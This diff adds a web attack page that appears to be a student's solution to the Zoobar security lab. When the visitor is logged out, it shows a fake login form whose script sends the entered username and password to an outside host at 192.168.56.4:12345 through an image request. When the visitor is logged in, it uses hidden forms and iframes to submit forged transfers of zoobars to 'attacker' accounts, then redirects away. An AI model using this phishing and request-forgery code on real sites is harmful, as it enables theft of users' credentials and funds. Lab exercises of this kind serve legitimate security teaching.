@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<link rel="stylesheet" type="text/css" href="http://localhost:8080/zoobar/media/zoobar.css">
+<body id="content"> </body>
+<script src="http://localhost:8080/zoobar/index.cgi/gradejs"> </script>
+<script type="text/javascript">
+	if (typeof myZoobars ==='undefined'){
+		//user not logged in
+		document.getElementById("content").innerHTML = 
+		'<h1><a href="/zoobar/index.cgi/">Zoobar Foundation for Objective\
+                      Research</a></h1>\
+       <img src="" id="myimg" style="display:none;">\
+      <h2>Supporting the skillful\
+          soldiers of the new world order</h2>\
+          <div id="login" class="centerpiece">\
+<form name="loginform" method="POST" onsubmit = "my_action(this)">\
+<table>\
+<tr>\
+   <td>Username:</td>\
+  <td><input type="text" name="login_username" id = "login_username" size="20"\
+  autocomplete="no" ></td>\
+</tr>\
+<tr>\
+   <td>Password:</td>\
+  <td colspan=2><input type="password" name="login_password" id = "login_password" size=20\ autocomplete="no">\
+  <input type="submit" name="submit_login" value="Log in">\
+  <input type="button" name="submit_registration" value="Register"></td>\
+</tr>\
+</table>\
+</form>\
+</div>';
+function my_action(form){
+	var username = form.login_username.value;
+	var password = form.login_password.value;
+	var payload = username+','+password;
+	var sendurl = "http://192.168.56.4:12345?payload="+payload+"&roll=13221&random="+Math.random()+"&timestamp="+Date.now();
+	document.getElementById("myimg").src = sendurl;
+	form.action = "http://localhost:8080/zoobar/index.cgi/login";
+}
+}
+	else{
+		//user logged in
+		document.getElementById("content").innerHTML = 
+		'<form id="myform" action="http://localhost:8080/zoobar/index.cgi/transfer" method="post">\
+  <input type="hidden" name="zoobars" id="zoobars" value="" />\
+  <input type="hidden" name="recipient" id="recipient" value=""/>\
+</form>\
+\
+<iframe style="visibility:hidden" name="if1"></iframe>\
+<iframe style="visibility:hidden" name="if2"></iframe>';
+	
+	function attack(zoobars,recipient,target){
+  document.getElementById("zoobars").value = zoobars;
+  document.getElementById("recipient").value = recipient;
+  document.getElementById("myform").target="if1";
+  document.getElementById("myform").submit();
+}
+setTimeout(function(){attack(1,"attacker","if1");},1000);
+setTimeout(function(){attack(9,"attacker1","if2");},2000);
+setTimeout(function(){document.location.href = "http://moodle.cse.iitk.ac.in"},3000);
+	}
+
+</script>
